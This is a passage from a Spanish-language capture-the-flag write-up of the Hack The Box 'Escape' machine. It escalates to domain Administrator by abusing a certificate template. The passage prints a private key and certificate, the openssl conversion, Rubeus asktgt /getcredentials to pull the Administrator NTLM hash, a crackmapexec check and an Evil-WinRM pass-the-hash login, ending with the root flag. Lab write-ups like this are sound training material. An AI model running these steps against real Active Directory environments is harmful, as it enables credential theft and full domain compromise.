/L16S7ap5MaxPRXuMNt4jrV/PDLs2QJDOpiDpT2Hnv3XqqqDvn0+yx5NuR8oEs4P
DC3Ok1c3FMpNYJpvsTZsfYUSkCrQDq+kVLUEfDcCgYBtBNFSjVYQ67axRalC0S3E
Q9M2Fy15fXg4lsu8+1e7zY7qB6pGvklcBtv/kyhoWKxGeUpR3XwpdzyDtePjyX8S
JSEAsbeIWp2nUY88r1M5oJNmkTTu+bUL58Gh1uvTYCRJKy8kI8jGQfSbCt185ig3
anWlPCS6ay9mUdGCDtgsAQKBgQCqDMo0yM4F4ukEtJ38m5rhktmy9Mgrv9iWHzOW
q0YutDb9zGUO3MjawfqkiWAic9QQaIgXgepWsXV1oANeCXO9tlopYfEGNvg+cVJv
9LcUEJJPFYxGdJxBK3SmWv538Tcxt3hhXNMX00iyz22c5Xppa6AGcK5AaMc6Vfge
ej2OzwKBgCI7iYV+FVgPZq5+iXsGNQx47bATgp20RH8X5RDHtqqp388L00OARaBu
EkAd+7QSePPiv0Xgj9qpEvAq/QKgph7sbsaaxv7YiMA+7qj53dxpKLS5C9qGyVju
2/pp8ZLKqI3BBCUFVCIgumTf5JeEGeo5n5GT+dZBxtNGKqIZ31rN
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAobYAasNCI4AQAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjE3MDY1MzMzWhcNMjUwNjE3
MDcwMzMzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC9gnRtwQ79Gj5YdloiY2nlL92N
k7RzOrQmRjA0+2VxCq7bQfGL9U9Euc5Sg6xyqSh6O5Wf7+JX/L+kLHagxCuZclse
Z6DaGHydIMiA73Gr0dEVbtYEXLzkFgaXRjDv4V/wtsCmYFKDyoON3OwWEDTJOstq
Bvq4q7Euoo9kEnolh6bNJ8KqfjwsL/DJq0DTRUAhNkD2cCCMYBTFIP3O3NAdHjnk
JbIbDHXGN9aFCZE0fRR/wut5Bzf6ojFAZ5cYmT/W1Zzhj5ZaIHslRsLpTsw5fAr4
ynpIMEnqt9tG8LHQfGaH439AYxzBNyYS+U7DP7VK1RFtZySPSUOsj/XPZAnxAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFC96EBaBGWMYbTjA6+uHLVombe/t
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAV6tknxdb31GWT5i9N+ZBWEoY4Rjx3X7yLWKniRDdw6CuUoHnEbmFJnaI
lW1yVtxgT7q0pKT+NP2Dtmtm74vpIFm67EnIiRXE4lr90Sj0YMW5D0vmX0Ez85VK
sgb+gLH0G3SaGaL/Jdg+UFpdGn6L76a1c3f6GA3O0yUkTHlexV+onF4Mep4GRpj7
H9LwQ1VUAUBUyrTnHZwBb/Om0DhfBhw9mY8vwlEgc9Hl+pNhwhy1z2iiLzix261g
XrYRbHN5xaTcY0aw8kIBYjWPtthGMxRtFgvRygSDJFjVUU9UldrJ4Sz8Sg5vRaOu
xeozQ1rZp5Ha22SsT63a/x53DNEk6g==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.6637836
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

Ahora tenemos que guardar la **key** y el **certificado** 

```bash
❯ nano cert.pem
❯ nano private.key
```

Ahora vamos a seguir la instrucción de usar **openssl** como no lo mencionan (No es necesario poner ninguna contraseña solo dale al ENTER)

```bash
❯ openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:

```

Ahora tenemos que subir el **cert.pfx** que nos genero y aparte tenemos que subir el **Rubeus** para que nos ayude a generar el hash <https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe> 

![](/assets/images/htb-writeup-escape/web6.png)

Así que comenzamos subiendo los 2 archivos 

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload cert.pfx
                                        
Info: Uploading /home/miguel7/Hackthebox/Escape/content/cert.pfx to C:\Users\Ryan.Cooper\Documents\cert.pfx
                                        
Data: 4376 bytes of 4376 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> upload Rubeus.exe
                                        
Info: Uploading /home/miguel7/Hackthebox/Escape/content/Rubeus.exe to C:\Users\Ryan.Cooper\Documents\Rubeus.exe
                                        
Data: 595968 bytes of 595968 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> dir


    Directory: C:\Users\Ryan.Cooper\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2023  12:15 AM           3283 cert.pfx
-a----        6/16/2023  11:58 PM         174080 Certify.exe
-a----        6/17/2023  12:16 AM         446976 Rubeus.exe
-a----        6/16/2023  11:08 PM        2028544 winPEASx64.exe


*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

Ahora siguiendo las instrucciones vamos a generar un **TGT** para obtener el **hash** **NTLMv2** del **Administrator** como no lo indican en los pasos 

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::9045:a178:c6da:1141%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  6/17/2023 12:19:33 AM
  EndTime                  :  6/17/2023 10:19:33 AM
  RenewTill                :  6/24/2023 12:19:33 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  IXS9XuDOHUuLF7OprYmGwA==
  ASREP (key)              :  2B03BE1F3BF4E7EDC5FE39E890ADA86D

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

Ahora verificamos que el **Hash** sea correcto para conectarnos con `evil-winrm` 

```bash
❯ crackmapexec winrm 10.10.11.202 -u 'Administrator' -H A52F78E4C751E5F5E17E1E9F3E58F4EE
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\Administrator:A52F78E4C751E5F5E17E1E9F3E58F4EE (Pwn3d!)
```

## Shell as Administrator 

Ahora nos conectamos 

```bash
❯ evil-winrm -i 10.10.11.202 -u 'Administrator' -H A52F78E4C751E5F5E17E1E9F3E58F4EE
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## Root flag 

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
d98d2853c8c76a576f6102e146fea568
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```


